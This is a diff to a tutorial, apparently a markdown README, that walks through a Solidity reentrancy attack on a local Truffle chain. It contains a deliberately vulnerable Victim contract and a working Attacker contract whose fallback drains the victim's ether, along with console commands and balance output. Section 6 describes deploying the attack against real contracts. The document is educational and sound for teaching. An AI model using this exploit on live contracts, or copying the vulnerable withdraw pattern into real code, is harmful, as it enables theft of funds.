@@ -41,13 +41,19 @@ $ touch contracts/Attacker.sol contracts/Victim.sol
 pragma solidity ^0.4.8;
 
 contract Victim {
+  uint withdrawableBalance = 2 ether;
 
   function withdraw() {
-    uint transferAmt = 100000000000000000;
-    if (!msg.sender.call.value(transferAmt)()) throw;
+    if (!msg.sender.call.value(withdrawableBalance)()) {
+      throw;
+    }
+
+    withdrawableBalance = 0;
   }
 
-  function deposit() payable {}
+  function deposit() payable {
+    withdrawableBalance = msg.value;
+  }
 }
 ```
 
@@ -59,24 +65,20 @@ pragma solidity ^0.4.8;
 import './Victim.sol';
 
 contract Attacker {
-  Victim v;
-  uint public count;
+  Victim victim;
 
-  event LogFallback(uint c, uint balance);
-
-  function Attacker(address victim) {
-    v = Victim(victim);
+  function Attacker(address victimAddress) {
+    victim = Victim(victimAddress);
   }
 
   function attack() {
-    v.withdraw();
+    victim.withdraw();
   }
 
+  // Fallback function which is called whenever Attacker receives ether
   function () payable {
-    count++;
-    LogFallback(count, this.balance);
-    if (count < 10) {
-      v.withdraw();
+    if (victim.balance >= msg.value) {
+      victim.withdraw();
     }
   }
 }
@@ -153,7 +155,7 @@ Now lets check the balance's of the 2 addresses we stored in variables. (acct1, 
 ```
 truffle(development)> web3.fromWei(getBalance(acct1).toString())
 
-'99.18' // or somthing close to this
+'99.9430758' // or something close to this
 ```
 
 ```
@@ -166,7 +168,7 @@ Now we are going to send our `Victim` contract some `ether`
 from the `acct1` address we unlocked earlier.
 
 ```
-truffle(development)> victim.then(contract => contract.deposit.sendTransaction({from: acct1, to: contractAddress, value: web3.toWei(11, 'ether')}))
+truffle(development)> victim.then(contract => contract.deposit.sendTransaction({from: acct1, to: victimAddress, value: web3.toWei(10, 'ether')}))
 ```
 
 So there's alot going on in this line of code, so lets break it down. Our
@@ -186,7 +188,7 @@ which should read or come close to the amounts below.
 ```
 truffle(development)> web3.fromWei(getBalance(acct1).toString())
 
-'88.18' // or somthing close to this
+'89.9404373' // or somthing close to this
 ```
 
 Now our victims contract has 11 ether balance.
@@ -194,7 +196,7 @@ Now our victims contract has 11 ether balance.
 ```
 truffle(development)> web3.fromWei(getBalance(victimAddress).toString())
 
-'11'
+'10'
 ```
 
 ### 5. Now for the `Attacker`'s side
@@ -227,8 +229,7 @@ that will then call the `Victim` contract instance's `withdraw()` method.
 attacker.then(contract => contract.attack())
 ```
 
-The `.attack()` method above is going to run recursively 10 times, because of the
-conditional in our `default payable` function.
+The `.attack()` method above calls withdraw which should only withdraw the withdrawable balance (2 ether in our example). The withdrawable balance should be zeroed out after calling withdraw. However, before zeroing out the withdrawable balance, our fallback function recursively calls withdraw until it drains all the ether from the victim.
 
 Now if everything is done correctly, we can see the reflection of what happened
 by checking the `Victim` and `Attacker`'s balances.
@@ -242,15 +243,19 @@ truffle(development)> web3.fromWei(getBalance(attackerAddress).toString())
 ```
 truffle(development)> web3.fromWei(getBalance(victimAddress).toString())
 
-'1'
+'0'
 ```
 
-So as you can see the `Victim`'s contract is missing an additional `10` eth!!!
+So as you can see all the `Victim`'s ether is gone!!!
 
-6. The Attack!!!
+### 6. The Attack!!!
 
 So the attacker finds a contract to attack, gets the contract's address and creates an
 `Attacker` contract with an instances of the `Victim`'s contract to call against and targets the
-the deployed `Victim`'s contract by address. Onces it has all of those variables in place, the attacker can
+the deployed `Victim`'s contract by address. Once it has all of those variables in place, the attacker can
 deploy the malicious contract to the Ethereum network and then call the `.attack()` method to drain
-the `Victim`s address.
+all of the `Victim`'s ether.
+
+### 7. Further reading
+
+https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
